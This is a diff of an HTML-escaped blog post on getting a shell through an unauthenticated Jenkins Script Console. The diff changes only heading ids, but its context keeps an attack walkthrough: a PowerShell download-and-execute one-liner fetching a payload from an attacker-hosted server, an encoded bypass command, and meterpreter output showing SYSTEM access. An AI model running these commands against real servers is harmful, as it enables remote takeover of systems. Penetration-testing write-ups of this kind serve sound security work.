@@ -28,7 +28,7 @@
 
 &lt;p&gt;Recently I came across a few &lt;a href=&#34;https://jenkins-ci.org/&#34;&gt;Jenkins&lt;/a&gt; continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lt;em&gt;&amp;lsquo;secure&amp;rsquo;&lt;/em&gt;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.&lt;/p&gt;
 
-&lt;h2 id=&#34;groooooooovy:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;groooooooovy&lt;/h2&gt;
+&lt;h2 id=&#34;groooooooovy&#34;&gt;groooooooovy&lt;/h2&gt;
 
 &lt;p&gt;At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the &lt;em&gt;Script Console&lt;/em&gt; that Jenkins provides:&lt;/p&gt;
 
@@ -60,7 +60,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;Nice and easy command execution! :D&lt;/p&gt;
 
-&lt;h2 id=&#34;interactive-shell-power-shell:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;interactive shell, power shell&lt;/h2&gt;
+&lt;h2 id=&#34;interactive-shell-power-shell&#34;&gt;interactive shell, power shell&lt;/h2&gt;
 
 &lt;p&gt;Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;reverse shell&lt;/a&gt; and moving on from there. On Windows based environments though, the builtin &lt;code&gt;cmd.exe&lt;/code&gt; definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.&lt;/p&gt;
 
@@ -70,7 +70,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A &lt;code&gt;payload&lt;/code&gt; which includes the &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&amp;rsquo;t worry it should be more clear after we have gone through it.&lt;/p&gt;
 
-&lt;h2 id=&#34;preparing-the-payload:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;preparing the payload&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-the-payload&#34;&gt;preparing the payload&lt;/h2&gt;
 
 &lt;p&gt;As already mentioned, I was going to use &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about &lt;em&gt;payload&lt;/em&gt; here, all it really is is a file that will be made available via HTTP for the powershell script to download.&lt;/p&gt;
 
@@ -86,9 +86,9 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;This file was finally served via HTTP using the python SimpleHTTPServer with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; which meant that it would be available at &lt;a href=&#34;http://192.168.252.1:8000/payload&#34;&gt;http://192.168.252.1:8000/payload&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;preparing-the-command:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;preparing the command&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-the-command&#34;&gt;preparing the command&lt;/h2&gt;
 
-&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;Net.WebClient.DownloadString&lt;/a&gt; object to download the payload we previously prepared and execute it.&lt;/p&gt;
+&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a [Net.WebClient.DownloadString](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&lt;/a&gt;) object to download the payload we previously prepared and execute it.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.252.1:8000/payload&#39;)
 &lt;/code&gt;&lt;/pre&gt;
@@ -103,7 +103,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;pwn:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;pwn&lt;/h2&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;pwn&lt;/h2&gt;
 
 &lt;p&gt;So, I now had the &lt;code&gt;payload&lt;/code&gt; file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!&lt;/p&gt;
 
@@ -136,7 +136,7 @@ meterpreter &amp;gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;automation:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;automation&lt;/h2&gt;
+&lt;h2 id=&#34;automation&#34;&gt;automation&lt;/h2&gt;
 
 &lt;p&gt;While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:&lt;/p&gt;
 
